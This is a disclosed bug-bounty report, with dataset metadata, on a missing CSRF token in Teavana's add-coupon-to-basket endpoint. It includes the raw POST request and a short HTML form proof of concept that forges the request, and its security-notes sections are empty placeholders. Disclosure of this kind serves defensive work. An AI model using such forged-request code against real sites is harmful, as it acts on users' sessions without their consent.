---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '226020'
original_report_id: '226020'
title: Missing CSRF Token On Add Coupon To Basket
weakness: Cross-Site Request Forgery (CSRF)
team_handle: starbucks
created_at: '2017-05-11T15:58:00.382Z'
disclosed_at: '2019-01-22T23:22:45.649Z'
has_bounty: false
visibility: full
substate: duplicate
vote_count: 8
asset_identifier: www.teavana.com
asset_type: URL
max_severity: none
tags:
- hackerone
- cross-site-request-forgery-csrf
---

# Missing CSRF Token On Add Coupon To Basket

## Metadata

- HackerOne Report ID: 226020
- Weakness: Cross-Site Request Forgery (CSRF)
- Program: starbucks
- Disclosed At: 2019-01-22T23:22:45.649Z
- Has Bounty: No
- Visibility: full
- Substate: duplicate

## Original Report

Hi,
When Adding Coupun It's missing CSRF Token, and at this time, i use `BOGO50` Coupun to reproduce it.

__Vuln Request__
```
POST /on/demandware.store/Sites-Teavana-Site/default/Home-AddCouponToBasket?couponcode=BOGO50&format=ajax HTTP/1.1
Host: www.teavana.com
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:53.0) Gecko/20100101 Firefox/53.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Content-Type: application/x-www-form-urlencoded
Content-Length: 0
Cookie: <some cookie>
Connection: close
Upgrade-Insecure-Requests: 1

```

__PoC Code__
```
<html>
<body>
<form action="https://www.teavana.com/on/demandware.store/Sites-Teavana-Site/default/Home-AddCouponToBasket?couponcode=BOGO50&format=ajax" method="POST">
<input type="hidden" name="" value="" />
<input type="submit" value="Submit request" />
</form>
</body>
</html>
```

Thanks, 
If you need video, i will create one !

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
